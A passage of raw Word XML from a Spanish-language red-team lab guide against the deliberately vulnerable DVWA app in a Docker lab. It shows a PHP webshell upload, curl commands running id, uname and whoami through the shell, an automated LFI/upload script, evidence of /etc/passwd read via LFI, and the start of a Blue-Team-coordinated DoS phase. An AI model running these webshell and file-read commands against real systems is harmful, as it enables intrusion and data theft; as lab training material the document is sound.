        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    'http://172.20.0.20/dvwa/vulnerabilities/upload/' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E458320" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    | grep -i 'succesfully\|error'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BC43A37" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71FA36C8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27147897" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Resultado esperado:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5762FBEA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>../../hackable/uploads/shell-test.php succesfully uploaded!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B672FA8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="109BE5E0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Paso 3:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Verificar ejecución remota de código:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CE6B70" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FC6FD8" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  echo '=== id ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=id'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="735B883C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  echo '=== uname -a ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=uname+-a'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19864CAD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  echo '=== whoami ==='; curl -s 'http://172.20.0.20/dvwa/hackable/uploads/shell-test.php?cmd=whoami'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50384B75" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB3B3B4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B01BEF4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Resultado esperado:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D078A2F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=== id ===</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754CE425" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>uid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">=33(www-data) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>gid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">=33(www-data) </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>groups</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>=33(www-data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D94CB0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">=== </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>uname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a ===</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="285FCF7C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Linux vulnerable-server ...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA78FD3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>=== whoami ===</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D45924D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>www-data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="710A8F87" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D311C1D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">8.5 Script completo (LFI + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>upload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> automatizados)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201057EF" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "LAB_TARGET=172.20.0.20 bash /root/scripts/phase-5-exploitation/web-shells.sh"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0A25AC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5653F3A7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Evidencia generada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7C2578" w14:paraId="44B75A00" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="6DB72209" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Archivo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3564"/>
          </w:tcPr>
          <w:p w14:paraId="25A1A157" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Contenido</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="2B6E3C64" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49049235" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>lfi-passwd.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4F69DDC9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>Contenido de /</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>etc</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>passwd</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve"> del target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="7A598618" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="3F0F9009" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>lfi-url.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="53157C97" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>URL exacta que explotó LFI</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w:rsidRPr="005F4B07" w14:paraId="6D812B32" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="577A2D5F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>upload-rce.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="052B69A9" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="es-GT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t xml:space="preserve">Confirmación de RCE con salidas de id y </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="005F4B07">
              <w:rPr>
                <w:sz w:val="19"/>
                <w:lang w:val="es-GT"/>
              </w:rPr>
              <w:t>uname</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007C2578" w14:paraId="631A5D00" w14:textId="77777777">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="0F62FCDA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>shell-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:color w:val="C00000"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>test.php</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4703" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E9EFF8"/>
          </w:tcPr>
          <w:p w14:paraId="638AE905" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
            <w:r>
              <w:rPr>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Webshell subida al servidor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="056EB054" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578"/>
    <w:p w14:paraId="026F4C81" w14:textId="5E39D096" w:rsidR="007C2578" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6B03E245" wp14:editId="481E2816">
            <wp:extent cx="5972810" cy="6438265"/>
            <wp:effectExtent l="0" t="0" r="8890" b="635"/>
            <wp:docPr id="19654862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4862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643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EAFEB" w14:textId="7A5A3CF8" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="72E1EAAE" wp14:editId="0A769712">
            <wp:extent cx="5972810" cy="6408420"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="1182460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460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640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F4840" w14:textId="7AA3D608" w:rsidR="005F4B07" w:rsidRDefault="005F4B07">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7A56F274" wp14:editId="055601B5">
            <wp:extent cx="5972810" cy="3754755"/>
            <wp:effectExtent l="0" t="0" r="8890" b="0"/>
            <wp:docPr id="17303055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30558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75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69701" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
        <w:spacing w:before="280" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
        </w:rPr>
        <w:t>9. Fase 6 — DoS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6BC64C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="1F3564"/>
        </w:pBdr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AA346A5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>REQUISITO OBLIGATORIO: Coordinación previa con Blue Team.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D9EFA6" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Antes de ejecutar cualquier vector, enviar al canal del equipo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CB86A0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>[RED TEAM — INICIO FASE 6]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F8815D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Fase   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> DoS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0987B371" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
